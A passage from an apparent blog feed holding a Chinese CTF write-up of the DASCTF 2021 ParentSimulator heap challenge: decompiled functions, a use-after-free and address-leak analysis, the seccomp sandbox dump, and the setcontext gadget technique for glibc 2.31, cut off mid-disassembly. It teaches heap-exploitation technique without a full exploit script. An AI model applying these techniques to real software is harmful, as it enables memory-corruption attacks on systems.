<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://tangzichengcc.github.io</id>
    <title>唐仔橙 • Posts by &#34;pwn&#34; category</title>
    <link href="https://tangzichengcc.github.io" />
    <updated>2024-01-27T15:28:41.000Z</updated>
    <category term="路由器" />
    <category term="浏览器安全" />
    <category term="csapp" />
    <category term="C语言" />
    <category term="旅游" />
    <category term="PWN入门" />
    <category term="堆" />
    <category term="docker" />
    <category term="脚本" />
    <category term="研究生课程" />
    <category term="诗歌" />
    <category term="调试" />
    <category term="KVM" />
    <category term="USENIX" />
    <category term="论文" />
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/</id>
        <title>pwn入门-48-setcontext应用</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/"/>
        <content type="html">&lt;p&gt;参考： &lt;a href=&#34;http://www.anquanke.com/post/id/236832&#34;&gt;www.anquanke.com/post/id/236832&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;DASCTF 2021中的ParentSimulator&lt;/p&gt;
&lt;h1 id=&#34;一、题目代码分析&#34;&gt;&lt;a href=&#34;#一、题目代码分析&#34; class=&#34;headerlink&#34; title=&#34;一、题目代码分析&#34;&gt;&lt;/a&gt;一、题目代码分析&lt;/h1&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;sub_1641&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;1.Give birth to a child&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;2.Change child&amp;#x27;s name&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;3.Show children&amp;#x27;s name&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;4.Remove your child&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;5.Edit child&amp;#x27;s description.&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;6.Exit&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt;&amp;gt; &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;base+4060这个地址存储的是标志位,表示是否被使用了 （ 记为 chunk_list_flag)&lt;/p&gt;
&lt;p&gt;base+40a0存储的是chunk的地址（ 记为 chunk_list)&lt;/p&gt;
&lt;h2 id=&#34;chunk结构分析如下&#34;&gt;&lt;a href=&#34;#chunk结构分析如下&#34; class=&#34;headerlink&#34; title=&#34;chunk结构分析如下&#34;&gt;&lt;/a&gt;chunk结构分析如下&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/image-20240123152741503-6610301.png&#34; alt=&#34;image-20240123152741503&#34;&gt;&lt;/p&gt;
&lt;p&gt;0x0 → pre_size &lt;/p&gt;
&lt;p&gt;0x8 → size&lt;/p&gt;
&lt;p&gt; 0x10 → name &lt;/p&gt;
&lt;p&gt;0x18 → gender &lt;/p&gt;
&lt;p&gt;0x20 → des &lt;/p&gt;
&lt;h2 id=&#34;1-add&#34;&gt;&lt;a href=&#34;#1-add&#34; class=&#34;headerlink&#34; title=&#34;1. add&#34;&gt;&lt;/a&gt;1. add&lt;/h2&gt;&lt;p&gt;添加的话可以重复添加到一个序号，覆盖之前的，比如一直选择1号，第二次添加会覆盖第一次的&lt;/p&gt;
&lt;h2 id=&#34;2-changename&#34;&gt;&lt;a href=&#34;#2-changename&#34; class=&#34;headerlink&#34; title=&#34;2. changename&#34;&gt;&lt;/a&gt;2. changename&lt;/h2&gt;&lt;p&gt;逻辑就是判断chunk_list_flag是否为1，为1的话，说明存在这个chunk，然后就去修改&lt;/p&gt;
&lt;h2 id=&#34;3-show&#34;&gt;&lt;a href=&#34;#3-show&#34; class=&#34;headerlink&#34; title=&#34;3. show&#34;&gt;&lt;/a&gt;3. show&lt;/h2&gt;&lt;p&gt;​	要检查chunk_list_flag、&lt;/p&gt;
&lt;h2 id=&#34;4-delete&#34;&gt;&lt;a href=&#34;#4-delete&#34; class=&#34;headerlink&#34; title=&#34;4. delete&#34;&gt;&lt;/a&gt;4. delete&lt;/h2&gt;&lt;p&gt;​		这里存在漏洞，未检查&lt;font color=&#34;red&#34;&gt;chunk_list_flag&lt;/font&gt;, 并且free之后没有清零， 存在UAF&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;sub_196B&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v0; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v2; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-4h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Please input index?&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  LODWORD(v0) = sub_15E9();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v2 = v0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)v0 &amp;gt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)v0 &amp;lt;= &lt;span class=&#34;number&#34;&gt;9&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v0 = qword_40A0[(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)v0];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v0 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;((&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *)qword_40A0[v2]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      dword_4060[v2] = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      LODWORD(v0) = &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Done&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; v0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		首先dword_4060并没有检查，那你把它置为0又有什么用呢？ 反正没有检查，然后虽然把40a0处的地址释放了，但是没有清0呀，导致还可以继续释放&lt;/p&gt;
&lt;h2 id=&#34;5-changecontent&#34;&gt;&lt;a href=&#34;#5-changecontent&#34; class=&#34;headerlink&#34; title=&#34;5. changecontent&#34;&gt;&lt;/a&gt;5. changecontent&lt;/h2&gt;&lt;p&gt;也是先判断chunk_list_flag是否为1&lt;/p&gt;
&lt;h2 id=&#34;666-改性别&#34;&gt;&lt;a href=&#34;#666-改性别&#34; class=&#34;headerlink&#34; title=&#34;666. 改性别&#34;&gt;&lt;/a&gt;666. 改性别&lt;/h2&gt;&lt;p&gt;只能改一次，&lt;font color=&#34;red&#34;&gt;这里并没有检查chunk_list_flag，所以一定要细心，当时没仔细看这里&lt;/font&gt;,并且会直接打印当前的性别，所以可以利用这个进行信息泄露，因为这里是bk的位置&lt;/p&gt;
&lt;p&gt;如果目标堆块处于 &lt;code&gt;tcache&lt;/code&gt;中，那么修改性别就能泄露 &lt;code&gt;堆地址&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果目标堆块处于 &lt;code&gt;unsort bin&lt;/code&gt;中，那么修改性别就有可能泄露 &lt;code&gt;libc地址&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;二、解题思路分析&#34;&gt;&lt;a href=&#34;#二、解题思路分析&#34; class=&#34;headerlink&#34; title=&#34;二、解题思路分析&#34;&gt;&lt;/a&gt;二、解题思路分析&lt;/h1&gt;&lt;h2 id=&#34;保护全开&#34;&gt;&lt;a href=&#34;#保护全开&#34; class=&#34;headerlink&#34; title=&#34;保护全开&#34;&gt;&lt;/a&gt;保护全开&lt;/h2&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Arch:     amd64&lt;span class=&#34;number&#34;&gt;-64&lt;/span&gt;-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RELRO:    Full RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Stack:    Canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PIE:      PIE enabled&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;开启了沙箱&#34;&gt;&lt;a href=&#34;#开启了沙箱&#34; class=&#34;headerlink&#34; title=&#34;开启了沙箱&#34;&gt;&lt;/a&gt;开启了沙箱&lt;/h2&gt;&lt;p&gt;​	常规思路便是通过ORW来读取flag&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; line  CODE  JT   JF      K&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;=================================&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0000&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000004&lt;/span&gt;  A = arch&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0001&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x05&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xc000003e&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A != ARCH_X86_64) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0007&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0002&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;  A = sys_number&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0003&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x35&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x01&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x40000000&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A &amp;lt; &lt;span class=&#34;number&#34;&gt;0x40000000&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0005&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0004&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x02&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A != &lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0007&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0005&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x01&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x0000003b&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A == execve) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0007&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0006&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x06&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x7fff0000&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ALLOW&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0007&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x06&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; KILL&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;libc版本2-31&#34;&gt;&lt;a href=&#34;#libc版本2-31&#34; class=&#34;headerlink&#34; title=&#34;libc版本2.31&#34;&gt;&lt;/a&gt;libc版本2.31&lt;/h2&gt;&lt;p&gt;版本： Ubuntu GLIBC 2.31-0ubuntu9&lt;/p&gt;
&lt;p&gt;​	ORW的一个通用思路是劫持free_hook等，写入setcontext的gadget，来设置相应的寄存器，然后劫持控制流，2.29版本之前和之后有所不同（  之前可以直接通过rdi索引， &lt;font color=&#34;red&#34;&gt;rdi是传入的chunk的地址&lt;/font&gt;）&lt;/p&gt;
&lt;h3 id=&#34;setcontext&#34;&gt;&lt;a href=&#34;#setcontext&#34; class=&#34;headerlink&#34; title=&#34;setcontext&#34;&gt;&lt;/a&gt;setcontext&lt;/h3&gt;&lt;p&gt;2.29之前&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;setcontext+&lt;span class=&#34;number&#34;&gt;53&lt;/span&gt;&amp;gt;:  mov    rsp,QWORD PTR [rdi+&lt;span class=&#34;number&#34;&gt;0xa0&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;setcontext+&lt;span class=&#34;number&#34;&gt;60&lt;/span&gt;&amp;gt;:  mov    rbx,QWORD PTR [rdi+&lt;span class=&#34;number&#34;&gt;0x80&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;setcontext+&lt;span class=&#34;number&#34;&gt;67&lt;/span&gt;&amp;gt;:  mov    rbp,QWORD PTR [rdi+&lt;span class=&#34;number&#34;&gt;0x78&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;setcontext+&lt;span class=&#34;number&#34;&gt;71&lt;/span&gt;&amp;gt;:  mov    r12,QWORD PTR [rdi+&lt;span class=&#34;number&#34;&gt;0x48&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;setcontext+&lt;span class=&#34;number&#34;&gt;75&lt;/span&gt;&amp;gt;:  mov    r13,QWORD PTR [rdi+&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;setcontext+&lt;span class=&#34;number&#34;&gt;79&lt;/span&gt;&amp;gt;:  mov    r14,QWORD PTR [rdi+&lt;span class=&#34;number&#34;&gt;0x58&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;setcontext+&lt;span class=&#34;number&#34;&gt;83&lt;/span&gt;&amp;gt;:  mov    r15,QWORD PTR [rdi+&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;setcontext+&lt;span class=&#34;number&#34;&gt;87&lt;/span&gt;&amp;gt;:  mov    rcx,QWORD PTR [rdi+&lt;span class=&#34;number&#34;&gt;0xa8&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		之后&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;580&lt;/span&gt;dd:       &lt;span class=&#34;number&#34;&gt;48&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;8b&lt;/span&gt; a2 a0 &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;    mov    rsp,QWORD PTR [rdx+&lt;span class=&#34;number&#34;&gt;0xa0&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;580e4&lt;/span&gt;:       &lt;span class=&#34;number&#34;&gt;48&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;8b&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;a &lt;span class=&#34;number&#34;&gt;80&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;    mov    rbx,QWORD PTR [rdx+&lt;span class=&#34;number&#34;&gt;0x80&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;580&lt;/span&gt;eb:       &lt;span class=&#34;number&#34;&gt;48&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;8b&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;a &lt;span class=&#34;number&#34;&gt;78&lt;/span&gt;             mov    rbp,QWORD PTR [rdx+&lt;span class=&#34;number&#34;&gt;0x78&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;580&lt;/span&gt;ef:       &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;c &lt;span class=&#34;number&#34;&gt;8b&lt;/span&gt; 